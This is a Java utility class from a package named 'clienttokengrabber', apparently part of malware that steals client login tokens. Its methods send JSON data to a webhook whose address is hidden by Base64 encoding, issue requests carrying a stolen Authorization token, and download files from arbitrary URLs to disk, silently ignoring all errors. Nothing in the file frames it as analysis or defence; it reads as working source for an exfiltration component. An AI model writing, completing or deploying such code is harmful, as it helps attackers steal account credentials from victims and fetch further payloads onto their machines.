package clienttokengrabber.utils;

import java.io.*;
import java.util.Base64;
import java.nio.charset.StandardCharsets;
import java.net.URL;
import javax.net.ssl.HttpsURLConnection;

public class Requests {
    public static void post(String jsonPayload, String url) {
        try {
            URL webhookURL = new URL(decode(url));
            HttpsURLConnection webhookConnection = (HttpsURLConnection) webhookURL.openConnection();
            webhookConnection.setRequestMethod("POST");
            webhookConnection.setRequestProperty("Content-Type", "application/json");
            webhookConnection.setDoOutput(true);

            OutputStream os = webhookConnection.getOutputStream();
            byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);

            System.out.println("POST Response Code: " + webhookConnection.getResponseCode());

            webhookConnection.disconnect();
        } catch (Exception ignored) {}
    }

    public static String get(String urlString, String token) {
        try {
            URL url = new URL(urlString);
            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
            if (token != null) connection.setRequestProperty("Authorization", token);

            int responseCode = connection.getResponseCode();
            System.out.println("GET Response Code: " + responseCode);
            if (responseCode == HttpsURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) response.append(line);
                reader.close();
                return response.toString();
            }
        } catch (Exception ignored) {}
        return null;
    }

    public static void download(String fileUrl, String savePath) {
        try {
            URL url = new URL(fileUrl);
            BufferedInputStream in = new BufferedInputStream(url.openStream());
            FileOutputStream out = new FileOutputStream(savePath);

            byte[] dataBuffer = new byte[1024];
            int dataRead;
            while ((dataRead = in.read(dataBuffer, 0, 1024)) != -1)
                out.write(dataBuffer, 0, dataRead);
        } catch (Exception ignored) {}
    }

    private static String decode(String url) {
        return new String(Base64.getDecoder().decode(url));
    }
}
